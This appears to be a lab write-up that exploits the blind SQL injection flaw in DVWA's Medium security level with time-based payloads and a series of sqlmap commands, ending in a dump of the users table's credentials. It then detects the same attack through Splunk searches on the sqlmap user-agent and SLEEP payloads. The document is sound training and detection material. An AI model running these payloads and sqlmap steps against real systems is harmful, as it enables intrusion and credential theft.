##  Launching an Attack from Another PC in the LAN:

The Medium level uses a form of SQL injection protection with the function mysql_real_escape_string(). However, due to the SQL query not having quotes around the parameter, this does not fully protect the query from being altered. The text box has been replaced with a pre-defined dropdown list and uses POST to submit the form (see source code).

![image](https://github.com/user-attachments/assets/ba981869-abd4-4b40-9554-9be73e9f1330)

 This code tries to protect against SQL injection using `mysqli_real_escape_string()`. This function escapes special characters in the user input.

But there’s a mistake in the SQL query:

```sql
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```
❌ The user input $id is not inside quotes — so attackers can still inject SQL if they use numbers or logical conditions.

so manyone can injecting something like:

```
1 AND SLEEP(5)
```
That becomes:

```sql
SELECT first_name, last_name FROM users WHERE user_id = 1 AND SLEEP(5);
This is a time-based blind SQL injection, and it works even though you escaped the input.
```

Attackers able to intercept and modify POST data using sqlmap tool .

You're targeting:

```
http://<ip>/DVWA/vulnerabilities/sqli_blind/
```

and the form sends a POST request with parameters like:

```
POST /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=1&Submit=Submit
```

You want to inject a payload into id that proves SQLi is possible — ideally a time-based blind SQLi.

### Using sqlmap

```
sqlmap -u "http://<ip>/DVWA/vulnerabilities/sqli_blind/" \
--data="id=1&Submit=Submit" \
--cookie="security=medium; PHPSESSID=YOUR_SESSION_ID" \
--technique=BT \
--level=2 \
--risk=2 \
--batch
```

![image](https://github.com/user-attachments/assets/34b7fb18-ba9c-472b-84ba-e22b468c98c9)

The injection point was confirmed on the id parameter (POST), which is vulnerable to both Boolean-based (id=1 AND 1682=1682) and Time-based (id=1 AND (SELECT SLEEP(5))) blind SQL injection; the backend uses MySQL (MariaDB fork) on Apache 2.4.63 running Debian Linux, and despite being set to Medium security, it is still injectable.

Extract data from dvwa DB:

```
sqlmap -u "http://172.17.128.158/DVWA/vulnerabilities/sqli_blind/" \
--data="id=1&Submit=Submit" \
--cookie="security=medium; PHPSESSID=9214bb7c3ab25045944f51649562e453" \
--dbs
```

![image](https://github.com/user-attachments/assets/c1c996df-594e-4f5d-8753-bb806893604c)

Found Databases.

Extract Table & User Info:

```
sqlmap -u "http://172.17.128.158/DVWA/vulnerabilities/sqli_blind/" \
--data="id=1&Submit=Submit" \
--cookie="security=medium; PHPSESSID=9214bb7c3ab25045944f51649562e453" \
-D dvwa --tables
```

![image](https://github.com/user-attachments/assets/519e573b-d747-406e-9edf-c9be196d1315)

Listed tables in dvwa.

```
sqlmap -u "http://172.17.128.158/DVWA/vulnerabilities/sqli_blind/" \
--data="id=1&Submit=Submit" \
--cookie="security=medium; PHPSESSID=9214bb7c3ab25045944f51649562e453" \
-D dvwa -T users --columns
```

Then list columns in the users table.

![image](https://github.com/user-attachments/assets/b8653499-fa81-467f-b511-9a710403f910)

Then dump usernames and passwords:

```
sqlmap -u "http://172.17.128.158/DVWA/vulnerabilities/sqli_blind/" \
--data="id=1&Submit=Submit" \
--cookie="security=medium; PHPSESSID=9214bb7c3ab25045944f51649562e453" \
-D dvwa -T users -C user,password --dump
```

![image](https://github.com/user-attachments/assets/782a129f-ae44-472a-a204-306fe512cdcf)
 
The attack was successful


## Next, we will detect the attack using Splunk

```
host=victim sourcetype="access-too_small" "sqlmap"
```

![image](https://github.com/user-attachments/assets/2b415a36-5af7-437b-a435-7986297bd40b)

From this, we can see that the sqlmap user-agent was used to perform the attack.


```
host=victim sourcetype="access-too_small" "sqlmap" id  SLEEP
```

![image](https://github.com/user-attachments/assets/6dbfb250-d3ec-4fc3-97fb-8b25513897e6)


 1. Time-based Blind SQL Injection Detected

The repeated use of PG_SLEEP(5) in payloads shows deliberate attempts to delay SQL responses:

Examples:

```sql
...AND 9814=(SELECT 9814 FROM PG_SLEEP(5))...
...;SELECT PG_SLEEP(5)--...
...SELECT 3841 FROM (SELECT(SLEEP(5)))...
```
This is a signature of time-based blind SQLi, where delays confirm conditional truth.

2. Automated Tool Used: sqlmap
Every log includes this user-agent:
`
"sqlmap/1.9.2#stable (https://sqlmap.org)"
`
This confirms that an attacker is automating the attack using sqlmap.

3. Vulnerable Parameter: id
Payloads are being injected into the URL parameter id=1, e.g.:

`/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit...`

This suggests the id parameter is not properly sanitized and is vulnerable to SQL injection.

5. Encoding Variants in Payloads
The logs show URL-encoded values, e.g.:

%3D → =

%28 → (

%29 → )

These confirm evasion techniques are being used to bypass simple string matching.

Table Format for easy identifiction-

```
host=victim sourcetype="access-too_small" "sqlmap"
| rex field=_raw "^(?<clientip>\d{1,3}(?:\.\d{1,3}){3})"
| rex field=_raw "\"(?:GET|POST) (?<uri_path>[^\s]+)"
| rex field=_raw "\"(?<useragent>sqlmap[^\"]*)\""
| table _time, clientip, host, useragent, uri_path
```

![image](https://github.com/user-attachments/assets/488144da-c2f7-49ce-b445-cd24ceb4b881)

## 🧾 Summary Table

| Finding           | Details                                                |
|-------------------|--------------------------------------------------------|
| **Attack Type**   | Time-Based Blind SQL Injection                         |
| **Tool Used**     | sqlmap/1.9.2                                           |
| **Vulnerable Param** | `id`                                                |
| **Injection Method** | `SLEEP(5)`, conditional `SELECT`s, nested subqueries |
| **Encoding Technique** | URL-encoding to hide SQLi characters             |







